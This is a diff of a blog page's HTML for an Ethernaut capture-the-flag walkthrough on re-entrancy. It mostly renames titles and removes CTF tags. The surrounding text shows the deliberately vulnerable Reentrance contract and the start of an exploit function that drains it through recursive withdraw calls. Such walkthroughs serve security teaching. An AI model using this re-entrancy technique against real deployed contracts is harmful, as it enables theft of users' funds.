@@ -3,7 +3,7 @@
 
 <head>
   <title>
-  CTF walkthrough, Ethernaut, #11 Re-entrancy · vyorkin.org
+  Ethernaut, #11 Re-entrancy · vyorkin.org
 </title>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -20,13 +20,13 @@
 
 
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="CTF walkthrough, Ethernaut, #11 Re-entrancy">
+  <meta name="twitter:title" content="Ethernaut, #11 Re-entrancy">
   <meta name="twitter:description" content="The objective of this challenge is to steal all the funds from the contract.
 // SPDX-License-Identifier: MIT pragma solidity ^0.8.2; contract Reentrance { mapping(address =&gt; uint256) public balances; function donate(address _to) public payable { balances[_to] &#43;= msg.value; } function balanceOf(address _who) public view returns (uint256 balance) { return balances[_who]; } function withdraw(uint256 _amount) public { if (balances[msg.sender] &gt;= _amount) { (bool result, ) = msg.sender.call{value: _amount}(&#34;&#34;); if (result) { _amount; } unchecked { balances[msg.">
 
 <meta property="og:url" content="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-11-re-entrancy/">
   <meta property="og:site_name" content="vyorkin.org">
-  <meta property="og:title" content="CTF walkthrough, Ethernaut, #11 Re-entrancy">
+  <meta property="og:title" content="Ethernaut, #11 Re-entrancy">
   <meta property="og:description" content="The objective of this challenge is to steal all the funds from the contract.
 // SPDX-License-Identifier: MIT pragma solidity ^0.8.2; contract Reentrance { mapping(address =&gt; uint256) public balances; function donate(address _to) public payable { balances[_to] &#43;= msg.value; } function balanceOf(address _who) public view returns (uint256 balance) { return balances[_who]; } function withdraw(uint256 _amount) public { if (balances[msg.sender] &gt;= _amount) { (bool result, ) = msg.sender.call{value: _amount}(&#34;&#34;); if (result) { _amount; } unchecked { balances[msg.">
   <meta property="og:locale" content="en">
@@ -35,7 +35,6 @@
     <meta property="article:published_time" content="2022-08-02T11:57:00+03:00">
     <meta property="article:modified_time" content="2022-08-02T11:57:00+03:00">
     <meta property="article:tag" content="Blockchain">
-    <meta property="article:tag" content="Ctf">
     <meta property="article:tag" content="Security">
     <meta property="article:tag" content="Ethernaut">
 
@@ -170,7 +169,7 @@
         <div class="post-title">
           <h1 class="title">
             <a class="title-link" href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-11-re-entrancy/">
-              CTF walkthrough, Ethernaut, #11 Re-entrancy
+              Ethernaut, #11 Re-entrancy
             </a>
           </h1>
         </div>
@@ -184,20 +183,11 @@
             </span>
           </div>
           
-          <div class="categories">
-  <i class="fa-solid fa-folder" aria-hidden="true"></i>
-    <a href="https://vyorkin.org/categories/blockchain/">Blockchain</a>
-      <span class="separator">•</span>
-    <a href="https://vyorkin.org/categories/ctf/">Ctf</a></div>
-
+          
           <div class="tags">
   <i class="fa-solid fa-tag" aria-hidden="true"></i>
     <span class="tag">
       <a href="https://vyorkin.org/tags/blockchain/">Blockchain</a>
-    </span>
-      <span class="separator">•</span>
-    <span class="tag">
-      <a href="https://vyorkin.org/tags/ctf/">Ctf</a>
     </span>
       <span class="separator">•</span>
     <span class="tag">
@@ -320,16 +310,16 @@ sequenceDiagram
     participant E as Exploit
     participant R as Reentrance
 
-E-&gt;&gt;R: donate()
-R--&gt;&gt;E: success
-E-&gt;&gt;R: withdraw()
-R--&gt;&gt;E: receive()
-E-&gt;&gt;R: withdraw()
-R--&gt;&gt;E: receive()
-E-&gt;&gt;R: ...
-Note right of R: until address(Reentrance).balance &gt; 0
-E-&gt;&gt;R: withdraw()
-R-&gt;&gt;R: balances[msg.sender] -= amount
+E->>R: donate()
+R-->>E: success
+E->>R: withdraw()
+R-->>E: receive()
+E->>R: withdraw()
+R-->>E: receive()
+E->>R: ...
+Note right of R: until address(Reentrance).balance > 0
+E->>R: withdraw()
+R->>R: balances[msg.sender] -= amount
 
 </div>
 
@@ -378,7 +368,7 @@ R-&gt;&gt;R: balances[msg.sender] -= amount
 <li>Then we call the <code>level.withdraw</code> function asking for the
 amount we just deposited. This tiggers a chain of the <code>withdraw</code>-<code>receive</code> calls.</li>
 </ul>
-<!-- raw HTML omitted -->
+<!--listend-->
 <div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">run</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">payable</span> {
 </span></span><span style="display:flex;"><span>    <span style="color:#434f54">level</span>.<span style="color:#434f54">donate</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>}(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>));
 </span></span><span style="display:flex;"><span>    <span style="color:#434f54">level</span>.<span style="color:#434f54">withdraw</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>);
